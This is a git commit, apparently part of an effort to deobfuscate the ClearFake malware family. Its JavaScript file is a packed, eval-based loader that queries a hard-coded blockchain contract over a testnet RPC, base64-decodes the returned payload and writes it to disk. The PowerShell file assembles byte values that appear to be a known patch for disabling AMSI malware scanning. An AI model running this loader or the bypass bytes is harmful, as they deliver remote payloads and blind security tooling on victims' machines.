ff70b3b88e373681c75234b91f9f97677af96c1c
Moritz Sanft <58110325+msanft@users.noreply.github.com>
2024-10-22 15:20:51 +0200

    wip

---
+++ clearlyfake/clearlyfake.js
@@ -0,0 +1,54 @@
+var _0xc47daa = _0x55cb;
+
+function _0x5070() {
+    var _0x33157a = ['55206WoVBei', '17471OZVAdR', '62fJMBmo', 'replace', '120QkxHIP', '1147230VPiwgB', 'toString', '614324JhgXcW', '3dPcEIu', '120329NucVSe', 'split', 'fromCharCode', '2252288wlgQHe', 'const|web3||eth|fs|inputString|filePath|abi||targetAddress|contractAddress|error|string|data|decodedData|to|methodId|call|newEncodedData|callContractFunction|require|Web3|await||encodedData|largeString|result|new_methodId|decodeParameter|address|encodeParameters|slice|blockNumber|toString|function|writeFileSync|newData|base64|utf|from|Buffer|console|Error|catch|contract|try|0x5684cff5|new|BINANCE_TESTNET_RPC_URL|decoded|0x9223f0630c598a200f99c5d4746531d10319a569|async|0x5c880fcb|calling|base64DecodedData|KEY_CHECK_VALUE|Saved|log|43152014|decoded_output|txt', '10lbdBwM', '0 l=k(\"1\");0 4=k(\"4\");0 1=L l(\"M\");0 a=\"O\";P y j(5){J{0 g=\"K\";0 o=g+1.3.7.u([\"c\"],[5]).v(2);0 q=m 1.3.h({f:a,d:o});0 p=1.3.7.s(\"c\",q);0 9=E.D(p,\"B\").x(\"C-8\");0 6=\"X.Y\";4.z(6,\"$t = \"+9+\"\\n\");0 r=\"Q\";0 w=W;0 i=r+1.3.7.u([\"t\"],[9]).v(2);0 A=m 1.3.h({f:a,d:i},w);0 e=1.3.7.s(\"c\",A);0 S=E.D(e,\"B\").x(\"C-8\");4.z(6,e);F.V(`U N d f:${6}`)}H(b){F.b(\"G R I y:\",b)}}0 5=\"T\";j(5);', '3417255SrBbNs'];
+    _0x5070 = function () {
+        return _0x33157a;
+    };
+    return _0x5070();
+}
+
+function _0x55cb(_0x31be23, _0x3ce6b4) {
+    var _0x5070af = _0x5070();
+    a = _0x55cb = function (_0x55cbe9, _0x551b8f) {
+        _0x55cbe9 = _0x55cbe9 - 0xd6;
+        var _0x408505 = _0x5070af[_0x55cbe9];
+        return _0x408505;
+    }
+    b = _0x55cb(_0x31be23, _0x3ce6b4);
+    console.log(a, b);
+    return a, b;
+}(function (_0x56d78, _0x256379) {
+    var _0x5f2a66 = _0x55cb,
+        _0x16532b = _0x56d78();
+    while (!![]) {
+        try {
+            var _0x5549b8 = parseInt(_0x5f2a66(0xe1)) / 0x1 * (parseInt(_0x5f2a66(0xe2)) / 0x2) + -parseInt(_0x5f2a66(0xd7)) / 0x3 * (parseInt(_0x5f2a66(0xd6)) / 0x4) + parseInt(_0x5f2a66(0xdd)) / 0x5 * (parseInt(_0x5f2a66(0xe0)) / 0x6) + parseInt(_0x5f2a66(0xe5)) / 0x7 + parseInt(_0x5f2a66(0xdb)) / 0x8 + -parseInt(_0x5f2a66(0xdf)) / 0x9 + -parseInt(_0x5f2a66(0xe4)) / 0xa * (parseInt(_0x5f2a66(0xd8)) / 0xb);
+            if (_0x5549b8 === _0x256379) break;
+            else _0x16532b['push'](_0x16532b['shift']());
+        } catch (_0x1147b3) {
+            _0x16532b['push'](_0x16532b['shift']());
+        }
+    }
+}(_0x5070, 0x53395), eval(function (_0x263ea1, _0x2e472c, _0x557543, _0x36d382, _0x28c14a, _0x39d737) {
+    var _0x458d9a = _0x55cb;
+    _0x28c14a = function (_0x3fad89) {
+        var _0x5cfda7 = _0x55cb;
+        return (_0x3fad89 < _0x2e472c ? '' : _0x28c14a(parseInt(_0x3fad89 / _0x2e472c))) + ((_0x3fad89 = _0x3fad89 % _0x2e472c) > 0x23 ? String[_0x5cfda7(0xda)](_0x3fad89 + 0x1d) : _0x3fad89[_0x5cfda7(0xe6)](0x24));
+    };
+    if (!'' ['replace'](/^/, String)) {
+        while (_0x557543--) {
+            _0x39d737[_0x28c14a(_0x557543)] = _0x36d382[_0x557543] || _0x28c14a(_0x557543);
+        }
+        _0x36d382 = [function (_0x12d7e8) {
+            return _0x39d737[_0x12d7e8];
+        }], _0x28c14a = function () {
+            return '\\w+';
+        }, _0x557543 = 0x1;
+    };
+    while (_0x557543--) {
+        _0x36d382[_0x557543] && (_0x263ea1 = _0x263ea1[_0x458d9a(0xe3)](new RegExp('\\b' + _0x28c14a(_0x557543) + '\\b', 'g'), _0x36d382[_0x557543]));
+    }
+    console.log(_0x263ea1);
+    return _0x263ea1;
+}(_0xc47daa(0xde), 0x3d, 0x3d, _0xc47daa(0xdc)[_0xc47daa(0xd9)]('|'), 0x0, {})));
---
+++ clearlyfake/tmp.ps1
@@ -0,0 +1,8 @@
+$haly = "0xB8"
+$ddng = "0x57"
+$xdeq = "0x00"
+$mbrf = "0x07"
+$ewaq = "0x80"
+$fqzt = "0xC3"
+$yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
+Write-Output $yfnjb
